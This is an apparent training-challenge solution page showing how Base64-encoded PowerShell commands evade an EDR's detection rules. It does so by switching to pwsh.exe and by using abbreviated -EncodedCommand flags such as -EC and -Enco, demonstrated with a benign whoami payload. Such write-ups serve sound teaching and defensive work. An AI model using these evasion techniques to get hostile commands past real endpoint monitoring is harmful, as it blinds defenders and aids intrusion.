---
title: "Solution 08: Base64 Encoded Commands"
difficulty: medium
category: "Command Line Obfuscation"
---

[Back to Challenge]({{ '/challenges/08-base64-encoding/' | relative_url }})

## Overview

PowerShell accepts Base64-encoded commands via `-EncodedCommand`. The EDR checks for `-encodedcommand` and `-enc` but not for abbreviated variants.

## Solution

```powershell
# Encode the command
$cmd = "Invoke-Expression 'whoami'"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)

# Method 1: Use pwsh.exe (bypasses Rule 5 entirely)
pwsh.exe -EncodedCommand $encoded

# Method 2: Use parameter abbreviation
# "-encodedcommand" is detected, but "-EC" or "-Enco" is not
powershell.exe -EC $encoded
powershell.exe -Enco $encoded

# Method 3: Use the full parameter with different casing
# Rule 2 uses toLowerAscii but the flag list has "-encodedcommand"
# Since toLowerAscii is used, casing alone won't help for Rule 2.
# But combining with pwsh.exe bypasses Rule 5:
pwsh.exe -EncodedCommand $encoded
```

## Why It Works

Rule 5 only checks processes named `powershell.exe`. Using `pwsh.exe` bypasses it completely. PowerShell also accepts flag abbreviations that aren't in the detection list.

The encoded command payload (Base64) does not contain the original keyword strings, so Rule 2 is also bypassed.
